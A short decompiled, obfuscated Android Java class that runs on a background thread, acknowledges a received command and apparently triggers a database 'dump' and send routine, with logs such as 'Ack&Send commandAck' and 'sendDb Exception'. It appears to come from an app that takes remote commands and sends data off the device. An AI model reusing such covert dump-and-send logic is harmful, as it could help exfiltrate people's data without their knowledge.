package com.network.media;

import android.content.Context;
import com.network.android.c.a.a;
import com.network.android.j;
import com.network.b.b;

/* access modifiers changed from: package-private */
public final class h implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ String f168a;
    final /* synthetic */ Context b;

    h(String str, Context context) {
        this.f168a = str;
        this.b = context;
    }

    public final void run() {
        try {
            a.a("Dump innerDump Ack&Send commandAck : " + this.f168a);
            b.p = true;
            if (this.f168a != null) {
                com.network.android.c.a.b.a(this.f168a);
                com.network.android.c.a.b.a(0, 2004, "", com.network.h.b.c(this.f168a));
            } else {
                com.network.android.c.a.b.a(0, 2004, "", null);
            }
            b.c(this.b);
            j.a(this.b);
        } catch (Throwable th) {
            a.a("Dump innerDump sendDb Exception- " + th.getMessage(), th);
        }
    }
}
